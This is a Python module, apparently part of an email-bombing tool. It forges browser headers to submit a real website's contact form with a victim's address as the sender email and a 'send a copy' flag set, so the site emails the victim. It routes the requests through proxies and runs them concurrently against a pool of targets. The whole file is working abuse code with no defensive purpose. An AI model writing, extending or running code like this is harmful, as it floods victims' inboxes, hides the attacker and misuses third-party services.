from os.path import basename

import requests

import module


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            '4aad05270c8579b9de22ce4bad27677c': 'a03ee196135a32b83edb58e011e45ea2',
        }

        headers = {
            'authority': 'oboi.house',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://oboi.house',
            'referer': 'https://oboi.house/contact',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'name': 'test https://oboi.house/contact',
            'email': target,
            'message': 'test https://oboi.house/contact',
            'subject': 'test https://oboi.house/contact',
            'date': '22/02/2023',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '99',
        }

        response = requests.post('https://oboi.house/contact', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=10)
        return response


def main():
    spam = ConcreteSpam(
        basename(__file__)[:-3], '{"status":1,"message":"Your email has been sent."}',
        target_pool_name='fkasn23'
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
